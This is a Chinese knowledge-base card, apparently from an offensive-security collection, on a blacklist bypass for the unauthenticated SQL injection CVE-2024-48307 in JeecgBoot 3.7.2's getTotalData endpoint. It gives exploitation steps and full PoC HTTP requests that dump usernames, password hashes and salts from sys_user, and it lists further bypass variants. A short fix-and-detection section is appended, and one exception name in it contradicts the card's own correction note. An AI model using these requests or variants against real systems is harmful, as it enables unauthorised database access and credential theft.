---
id: web-java-framework-jeecgboot-jimureport-comma-field-concat-check-bypass
title: JeecgBoot 3.7.2 拖拽数据集 getTotalData 的 concat 黑名单绕过：字段名改用「username,password,salt」多列裸写，渲染后仍是多列输出
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-jimureport-comma-field-concat-check-bypass
tags:
- java
- jeecgboot
- jimureport
- sqli
- freemarker
- blacklist-bypass
- unauth
cve:
- CVE-2024-48307
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 3.7.2（原文实测该版本已加 concat 检测、但可用裸多列绕过；受影响区间原文未给出）
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-07T23:44:18+08:00'
  notes: '已对照 content.md 与 img/09/10/11/12 核对：img/09 为 3.7.2 原 payload 被拦响应 数据查询失败:java.lang.RuntimeException: org.jeecg.modules.jmreport.common.excepiton.JimuSqlInjectionException: 字段不合法，存在SQL注入风险!---->concat(username,...)；img/10 为 handleOnlineForm 中 var7=c.a(var7)/var6=c.a(var6) 与 config 展开（name size=2、value size=2、fieldName=concat(username,0x3a,password,0x3a,salt)）；img/11 为 c.a() 反射调用与异常栈（JimuSqlInjectionException 全名）；img/12 为 3.7.2 裸列名绕过成功响应 chartData 中出现 username/password/salt 三键(admin:cb362cfeefbf3d8d:RCGTeGiH 一行为 admin 行)。已更正两处抄录错误：标题『user,pass,salt』->原文字段实为 username,password,salt；『JmSqlInjectionException』->JimuSqlInjectionException（同时同步修正 knowledge 卡与 README 索引）。另外原文 3.7.2 只是『对 concat 字段进行了检测』，卡内『检测命中样本是函数调用』属对异常消息的合理推断，已在验证备注中标注为推断。未在本机搭靶场、未发送原文请求。'
url: /docs/web/java/framework/web-java-framework-jeecgboot-jimureport-comma-field-concat-check-bypass/
draft: false
kb_aliases:
- getTotalData concat 绕过
- 3.7.2 JimuSqlInjectionException 绕过
- 字段不合法 存在SQL注入风险 绕过
- 逗号多列替代 concat
- handleOnlineForm c.a 检测绕过
---

## 一句话结论

JeecgBoot 3.7.2 在拖拽数据集 `getTotalData` 的字段名插值处加了注入检测：`handleOnlineForm` 里对 `config`/`condition` 调 `c.a()`，经反射调用 `JimuSqlInjectionException` 抛出「字段不合法，存在SQL注入风险」，而该检测的命中样本是 `concat(...)` 这类函数调用；把 payload 从 `concat(username,0x3a,password,0x3a,salt)` 改成裸列名序列 `username,password,salt`，检测放行，FreeMarker 渲染后依然在 SELECT 列表里输出三列，口令哈希照旧回显。

## 原理

- 3.7.2 的 `org.jeecg.modules.drag.service.a.j#handleOnlineForm` 在把 `config` 重排成 `queryFields` 前后各插入一次 `c.a(var7)` / `c.a(var6)` 校验（`var7 = e.a.a(config, condition)`、`var6 = e.a.a(condition)`）。
- `c.a()` 不是硬编码规则，而是通过反射调用检测入口（原文用调试器可见的 `org.jeecg.modules.jmreport.common.util.*` 类），最终抛出 `org.jeecg.modules.jmreport.common.excepiton.JimuSqlInjectionException: 字段不合法，存在SQL注入风险!---->concat(username,...`；异常消息里直接带上了被判定为非法的那段原文，说明校验规则以“函数调用/表达式特征”为命中依据。
- 漏洞根因没有变：`OnlDragDataSourceDao.selectListBySql` 的 FreeMarker 模板依旧把 `${field.formula}(${field.statisticaField}) ${field.alias}` 与 `${queryFields.nameField}` 原样插进 SQL。检测是在模板渲染**之前**对 JSON 值做的字符串匹配，模板渲染在**之后**，两者看的不是同一份内容。
- 为什么裸多列能过检测又达成同样危害：模板里 `nameField` 会被拼成 `..., ${queryFields.nameField}, ${queryFields.nameField} as name` 出现在 SELECT 列表；只要 `nameField` 里带逗号，渲染结果就是多个输出列。`username,password,salt` 不含括号、不含 `select`/`concat` 关键词，通过黑名单；渲染后等于 `SELECT ..., username, password, salt, ...`，把原本要靠 `concat` 才能取到的三列直接摊平成三个字段。
- 因此这不是“同一条 payload 换编码”，而是**检测口径与模板语法的不对称**：检测假设攻击者必须调函数才能把多列合成一列输出，而 SQL 的 SELECT 列表本身就允许逗号分隔多列，不需要任何函数。

## 触发条件

- JeecgBoot 已升级到带 `JimuSqlInjectionException`/`c.a()` 检测的版本（原文实测 3.7.2），但模板拼接逻辑未改成白名单。
- 拖拽数据集接口仍匿名可达（`ShiroConfig` 的 `anon` 规则未收紧）。
- 注入值所在键（`config.name[].fieldName`）允许包含逗号——即校验只查函数/关键字而不查逗号本身。
- 目标表存在可读的多个目标列（示例为 `sys_user` 的 `username`/`password`/`salt`）。

## 利用步骤

1. 先用原 payload 确认检测存在：提交 `fieldName: "concat(username,0x3a,password,0x3a,salt)"`，若响应 `success:false` 且 message 含 `JimuSqlInjectionException: 字段不合法，存在SQL注入风险`，说明目标已打补丁。
2. 从模板推导可用语法：`nameField` 落在 SELECT 列表的逗号分隔位置，因此逗号即列分隔符，无需函数。
3. 改成裸列名序列 `fieldName: "username,password,salt"` 重发；检测不再命中，FreeMarker 渲染出 `..., username, password, salt, ...`。
4. 读取响应 `result.chartData`：每个对象上直接出现 `username`/`password`/`salt` 三个键（值为明文用户名与哈希）。
5. 按同法把任意列拼进列表（`id,username,password,salt,role_code` 等），或用逗号拼接子查询/别名扩展读取面。

## PoC

```http
# 打补丁后的原 payload：被检测拦截
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: 127.0.0.1:12345
Content-Type: application/json

{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password,0x3a,salt)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"string"}],"type":[]}}
# => {"success":false,"message":"数据查询失败:java.lang.RuntimeException: ...JimuSqlInjectionException: 字段不合法，存在SQL注入风险!---->concat(username,..."}
```

```http
# 绕过：裸列名序列，检测放行，渲染成多列
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: 127.0.0.1:12346
Content-Type: application/json

{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"username,password,salt","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"string"}],"type":[]}}
# => {"success":true,"code":200,"result":{"chartData":[{"username":"admin","password":"cb362cfeefbf3d8d","salt":"RCGTeGiH",...}]}}
```

## 变体与关联

- 变体：检测只盯函数名时，可用其它不触发规则的多列写法：`username,password,salt`、`id,username,password,salt`，或 `tableName` 位置用 `sys_user` 之后的逗号拼接（`FROM` 段不支持逗号，改在 `ORDER BY ${sorts.field} ${sorts.type}` 处注入）。
- 变体：若检测覆盖逗号，则退回 FreeMarker 语法层构造（`${'con'}${'cat'}(...)`、`?eval`），或利用其它未受检的插值点（`timeCondition.timeField`、`sorts.field`）。
- 关联：[[web-java-framework-jeecgboot-drag-gettotaldata-freemarker-sqli]]（同一入口的原始未授权注入与完整 FreeMarker 模板清单）、[[web-java-component-jimureport-queryfieldbysql-time-blind-sqli]]（同产品族里“渲染前后过滤错位”的另一种利用）、[[web-generic-sqli-blind-filter-bypass-functions]]（关键词黑名单不对称的通用思路）。
- 边界：若版本改成列名白名单（必须命中已知列且不允许逗号），本绕过失效；若接口已要求登录，还需先获得任意账号；`formType=design`/`compName=JPivotTable` 时不会走到该检测点。

## 检测与防御

- 修复：不要再对渲染前的 JSON 值做字符串黑名单；把 `fieldName` 限定为单一合法标识符（正则 `^[A-Za-z_][A-Za-z0-9_]*$`）并与数据源列清单比对，逗号、括号、空格一律拒绝；根本方案是改成用查询构造器/参数化，不渲染用户输入进 SQL。
- 加固：把该接口移出 Shiro `anon`；对同一字段名的多次重试（含 `concat`→裸列名的变异）做告警。
- 检测：请求 `config.name[].fieldName` 含逗号的多列写法；响应 `result.chartData` 内出现 `username`/`password`/`salt` 等敏感列键；前一次请求报 `JmSqlInjectionException`、紧接着同接口换列名成功的“探测-绕过”节奏。
